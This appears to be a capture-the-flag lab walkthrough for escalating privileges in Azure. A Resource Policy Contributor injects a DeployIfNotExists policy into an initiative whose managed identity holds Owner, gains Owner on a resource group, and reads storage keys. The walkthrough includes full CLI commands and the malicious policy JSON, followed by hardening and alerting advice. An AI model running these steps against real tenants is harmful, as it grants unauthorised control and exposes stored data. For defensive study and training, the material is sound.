# Azure Policy Privilege Escalation

**Provider:** Azure | **Category:** Governance / Privilege Escalation

## Scenario

A user was assigned the `Resource Policy Contributor` role to manage compliance
policies on the subscription. This role appears harmless — it deals with policies,
not access control. However, it grants write access to policy definitions and
initiative definitions.

An administrator previously assigned a monitoring initiative to the subscription,
giving its managed identity `Owner` on the subscription for convenience. Since
`Resource Policy Contributor` includes `Microsoft.Authorization/policySetDefinitions/write`,
the attacker can inject a malicious `DeployIfNotExists` policy into the existing
initiative. When a remediation task is triggered, the managed identity — which holds
`Owner` — executes an ARM template that grants the attacker `Owner` on the target
resource group.

*Original research: [Elevating Privileges Through Azure Policy](https://medium.com/@vladimir.tul/elevating-privileges-through-azure-policy-872298cf673f)*

## Attack Path

```
[Attacker]  Resource Policy Contributor on subscription
    |
    v
Enumerate policy assignments → find initiative with Owner managed identity
    |
    v
Create malicious DeployIfNotExists policy definition
(ARM template: assign Owner to attacker at remediation scope)
    |
    v
Update existing initiative to include the malicious policy
    |
    v
Trigger remediation task against non-compliant storage account in target RG
    |
    v
Managed identity (Owner) executes ARM → attacker gains Owner on target RG
    |
    v
az storage account keys list → download flag blob
```

### Step 1 — Authenticate as policyuser

```bash
az login --username <policyuser_upn> --password <policyuser_password>
```

### Step 2 — Enumerate policy assignments and managed identity roles

```bash
SUBSCRIPTION_ID="<subscription_id>"

# Find the initiative assignment
az policy assignment list --scope "/subscriptions/$SUBSCRIPTION_ID" \
  --query "[].{name:name, id:id, identityPrincipalId:identity.principalId}" -o table

# Confirm the managed identity has Owner
MANAGED_IDENTITY_ID="<managed_identity_principal_id>"
az role assignment list --all \
  --query "[?principalId=='$MANAGED_IDENTITY_ID'].{role:roleDefinitionName, scope:scope}" -o table
```

### Step 3 — Get your own object ID

```bash
MY_OBJECT_ID=$(az ad signed-in-user show --query id -o tsv)
echo "My object ID: $MY_OBJECT_ID"
```

### Step 4 — Create the malicious policy definition

```bash
cat > /tmp/privesc_policy.json << POLICY
{
  "if": {
    "field": "type",
    "equals": "Microsoft.Storage/storageAccounts"
  },
  "then": {
    "effect": "DeployIfNotExists",
    "details": {
      "type": "Microsoft.Authorization/roleAssignments",
      "roleDefinitionIds": [
        "/providers/Microsoft.Authorization/roleDefinitions/8e3af657-a8ff-443c-a75c-2fe8c4bcb635"
      ],
      "existenceCondition": {
        "field": "Microsoft.Authorization/roleAssignments/principalId",
        "equals": "$MY_OBJECT_ID"
      },
      "deployment": {
        "properties": {
          "mode": "incremental",
          "template": {
            "\$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
            "contentVersion": "1.0.0.0",
            "parameters": {
              "raName": {
                "type": "string",
                "defaultValue": "[newGuid()]"
              }
            },
            "resources": [
              {
                "type": "Microsoft.Authorization/roleAssignments",
                "apiVersion": "2022-04-01",
                "name": "[parameters('raName')]",
                "properties": {
                  "roleDefinitionId": "/providers/Microsoft.Authorization/roleDefinitions/8e3af657-a8ff-443c-a75c-2fe8c4bcb635",
                  "principalId": "$MY_OBJECT_ID"
                }
              }
            ]
          }
        }
      }
    }
  }
}
POLICY

MALICIOUS_POLICY_ID=$(az policy definition create \
  --name "privesc-policy-$(date +%s)" \
  --display-name "Storage Monitoring Remediation" \
  --description "Remediate non-compliant storage accounts" \
  --rules /tmp/privesc_policy.json \
  --mode All \
  --query id -o tsv)

echo "Malicious policy ID: $MALICIOUS_POLICY_ID"
```

### Step 5 — Inject the malicious policy into the existing initiative

```bash
INITIATIVE_NAME="<initiative_name>"

# Preserve the existing policy reference while adding the malicious one
EXISTING_POLICY_ID=$(az policy set-definition show --name "$INITIATIVE_NAME" \
  --query "policyDefinitions[0].policyDefinitionId" -o tsv)

az policy set-definition update --name "$INITIATIVE_NAME" \
  --definitions "[
    {\"policyDefinitionId\": \"$EXISTING_POLICY_ID\", \"policyDefinitionReferenceId\": \"audit_storage_tag\"},
    {\"policyDefinitionId\": \"$MALICIOUS_POLICY_ID\", \"policyDefinitionReferenceId\": \"privesc_policy\"}
  ]"
```

### Step 6 — Trigger a remediation task

```bash
ASSIGNMENT_ID="<policy_assignment_id>"
TARGET_RG="<target_resource_group>"

az policy remediation create \
  --name "privesc-remediation" \
  --policy-assignment "$ASSIGNMENT_ID" \
  --definition-reference-id "privesc_policy" \
  --resource-group "$TARGET_RG" \
  --resource-discovery-mode ReEvaluateCompliance

# Poll until provisioning state is Succeeded (usually 1–3 minutes)
az policy remediation show \
  --name "privesc-remediation" \
  --resource-group "$TARGET_RG" \
  --query "{state:provisioningState, succeeded:resourcesRemediatedCount}" -o json
```

### Step 7 — Read the flag

```bash
TARGET_SA="<target_storage_account>"

KEY=$(az storage account keys list \
  --account-name "$TARGET_SA" \
  --resource-group "$TARGET_RG" \
  --query "[0].value" -o tsv)

az storage blob download \
  --account-name "$TARGET_SA" \
  --account-key "$KEY" \
  --container-name "secrets" \
  --name "flag.txt" \
  --file /tmp/flag.txt

cat /tmp/flag.txt
```

## How to Fix in Production

1. **Follow least privilege for managed identities**: Assign only the roles the policy
   actually requires. A storage-tagging policy needs `Storage Account Contributor` — not
   `Owner`. Review `roleDefinitionIds` in every built-in `DeployIfNotExists` policy before
   assigning it.
2. **Treat `Resource Policy Contributor` as a privileged role**: It grants write access to
   initiative definitions, which can be used to inject arbitrary `DeployIfNotExists` policies
   into existing assignments that already have a privileged managed identity.
3. **Alert on initiative definition changes**: Enable Azure Monitor activity log alerts for
   `Microsoft.Authorization/policySetDefinitions/write` events.
4. **Audit managed identity role assignments regularly**:
   ```bash
   az role assignment list --all \
     --query "[?roleDefinitionName=='Owner' || roleDefinitionName=='User Access Administrator']" \
     -o table
   ```
5. **Use separate initiative assignments per workload**: Avoid one catch-all initiative
   assignment with a single privileged managed identity — limit blast radius.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Abuse Elevation Control Mechanism | [T1548](https://attack.mitre.org/techniques/T1548/) |
| Valid Accounts: Cloud Accounts | [T1078.004](https://attack.mitre.org/techniques/T1078/004/) |
| Cloud Infrastructure Discovery | [T1580](https://attack.mitre.org/techniques/T1580/) |
| Modify Cloud Compute Infrastructure | [T1578](https://attack.mitre.org/techniques/T1578/) |
